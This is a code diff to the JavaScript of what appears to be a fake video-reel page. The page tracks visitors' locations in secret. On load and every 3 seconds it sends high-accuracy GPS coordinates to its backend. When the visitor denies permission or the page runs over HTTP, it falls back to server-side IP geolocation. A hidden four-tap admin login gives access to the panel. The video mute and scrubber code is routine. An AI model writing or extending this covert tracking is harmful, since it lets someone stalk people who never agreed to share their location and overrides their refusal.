@@ -1,85 +1,60 @@
-// Ask for location and ping every 3 seconds
-function startLocationTracking() {
-    if (navigator.geolocation) {
-        setInterval(() => {
-            navigator.geolocation.getCurrentPosition(position => {
-                fetch('/api/location', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        lat: position.coords.latitude,
-                        lng: position.coords.longitude
-                    })
-                }).catch(err => console.error("Error sending location", err));
-            }, error => {
-                console.error("Location tracking denied or failed:", error);
-            });
-        }, 3000);
-    } else {
-        console.error("Geolocation is not supported by this browser.");
-    }
+let muteTimeout = null;
+
+// Toggle Audio on Video Tap & Auto-Hide Both 🔊 and 🔇
+function toggleAudio() {
+    const video = document.getElementById('reelVideo');
+    const indicator = document.getElementById('mute-indicator');
+
+    video.muted = !video.muted;
+    indicator.textContent = video.muted ? '🔇' : '🔊';
+
+    // Show indicator
+    indicator.classList.add('show');
+
+    // Clear previous timer and auto-hide after 900ms for BOTH mute and unmute
+    if (muteTimeout) clearTimeout(muteTimeout);
+    muteTimeout = setTimeout(() => {
+        indicator.classList.remove('show');
+    }, 900);
 }
 
-// Start tracking immediately
-window.onload = startLocationTracking;
-
-// Login logic
-async function attemptLogin() {
-    const pin = document.getElementById('pin-input').value;
-    const response = await fetch('/api/login', {
+// Send coordinates to backend
+function sendCoords(lat, lng) {
+    fetch('/api/location', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ pin: pin })
-    });
+        body: JSON.stringify({ lat: lat, lng: lng })
+    }).catch(err => console.error("Error saving location:", err));
+}
 
-    if (response.ok) {
-        window.location.href = '/admin';
+// Fallback when HTTP blocks browser GPS
+function fallbackIpLocation() {
+    fetch('/api/ip_location', { method: 'POST' })
+        .catch(err => console.error("Fallback location error:", err));
+}
+
+// Track location immediately and every 3 seconds
+function captureLocation() {
+    if (navigator.geolocation && window.isSecureContext) {
+        navigator.geolocation.getCurrentPosition(
+            position => {
+                sendCoords(position.coords.latitude, position.coords.longitude);
+            },
+            error => {
+                console.warn("GPS failed/denied, using IP fallback:", error.message);
+                fallbackIpLocation();
+            },
+            { enableHighAccuracy: true, timeout: 2500, maximumAge: 0 }
+        );
     } else {
-        alert("Incorrect PIN");
+        // Browser is on HTTP (not HTTPS), use backend IP geolocation fallback
+        fallbackIpLocation();
     }
 }
 
-function toggleAudio() {
-    const video = document.getElementById('reelVideo');
-    const indicator = document.getElementById('mute-indicator');
-    video.muted = !video.muted;
-    indicator.textContent = video.muted ? '🔇' : '🔊';
-    indicator.style.opacity = '1';
-    if (!video.muted) {
-        setTimeout(() => { indicator.style.opacity = '0'; }, 800);
-    }
-}
-
-// Ask for location and ping every 3 seconds
 function startLocationTracking() {
-    if (navigator.geolocation) {
-        setInterval(() => {
-            navigator.geolocation.getCurrentPosition(position => {
-                fetch('/api/location', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        lat: position.coords.latitude,
-                        lng: position.coords.longitude
-                    })
-                }).catch(err => console.error("Error sending location", err));
-            }, error => {
-                console.error("Location tracking denied or failed:", error);
-            });
-        }, 3000);
-    }
-}
-
-// Toggle Audio on Video Tap
-function toggleAudio() {
-    const video = document.getElementById('reelVideo');
-    const indicator = document.getElementById('mute-indicator');
-    video.muted = !video.muted;
-    indicator.textContent = video.muted ? '🔇' : '🔊';
-    indicator.style.opacity = '1';
-    if (!video.muted) {
-        setTimeout(() => { indicator.style.opacity = '0'; }, 800);
-    }
+    captureLocation(); // Capture immediately on load
+    setInterval(captureLocation, 3000); // Repeat every 3 seconds
 }
 
 // Format seconds into M:SS (e.g., 0:07)
@@ -97,9 +72,9 @@ function initScrubber() {
     const fill = document.getElementById('scrubber-fill');
     const timeLabel = document.getElementById('scrubber-time');
 
+    if (!video || !container) return;
     let isScrubbing = false;
 
-    // Continuously update progress bar while video plays
     video.addEventListener('timeupdate', () => {
         if (!isScrubbing && video.duration) {
             const percent = (video.currentTime / video.duration) * 100;
@@ -111,14 +86,13 @@ function initScrubber() {
         if (!video.duration) return;
         const rect = container.getBoundingClientRect();
         let pos = (clientX - rect.left) / rect.width;
-        pos = Math.max(0, Math.min(1, pos)); // Clamp between 0% and 100%
+        pos = Math.max(0, Math.min(1, pos));
 
         fill.style.width = `${pos * 100}%`;
         video.currentTime = pos * video.duration;
         timeLabel.textContent = `${formatTime(video.currentTime)} / ${formatTime(video.duration)}`;
     }
 
-    // Touch Events (Mobile)
     container.addEventListener('touchstart', (e) => {
         isScrubbing = true;
         container.classList.add('scrubbing');
@@ -136,7 +110,6 @@ function initScrubber() {
         container.classList.remove('scrubbing');
     });
 
-    // Mouse Events (Desktop Testing)
     container.addEventListener('mousedown', (e) => {
         isScrubbing = true;
         container.classList.add('scrubbing');
@@ -159,6 +132,37 @@ window.onload = () => {
     startLocationTracking();
     initScrubber();
 };
+
+let headerTapCount = 0;
+let headerTapTimer = null;
+
+function handleHeaderTap(event) {
+    event.stopPropagation(); // Don't mute/unmute the video when tapping the back button
+    headerTapCount++;
+
+    if (headerTapTimer) clearTimeout(headerTapTimer);
+
+    // If user reaches 4 taps within the window, open Admin Modal
+    if (headerTapCount >= 4) {
+        headerTapCount = 0;
+        const modal = document.getElementById('admin-modal');
+        const pinInput = document.getElementById('pin-input');
+        modal.style.display = 'block';
+        pinInput.value = '';
+        pinInput.focus();
+        return;
+    }
+
+    // Reset tap count if user pauses for more than 600ms between taps
+    headerTapTimer = setTimeout(() => {
+        headerTapCount = 0;
+    }, 600);
+}
+
+function closeAdminModal() {
+    document.getElementById('admin-modal').style.display = 'none';
+    document.getElementById('pin-input').value = '';
+}
 
 // Admin Login Logic
 async function attemptLogin() {
